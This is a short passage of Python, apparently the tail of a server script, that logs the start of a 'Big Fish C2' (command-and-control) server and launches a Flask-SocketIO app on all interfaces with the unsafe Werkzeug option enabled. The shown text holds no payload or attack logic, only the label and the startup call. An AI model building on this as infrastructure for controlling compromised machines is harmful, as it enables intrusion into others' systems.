    logger.info(f"[✓] Big Fish C2 on port {PORT}")
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False,
                 allow_unsafe_werkzeug=True)
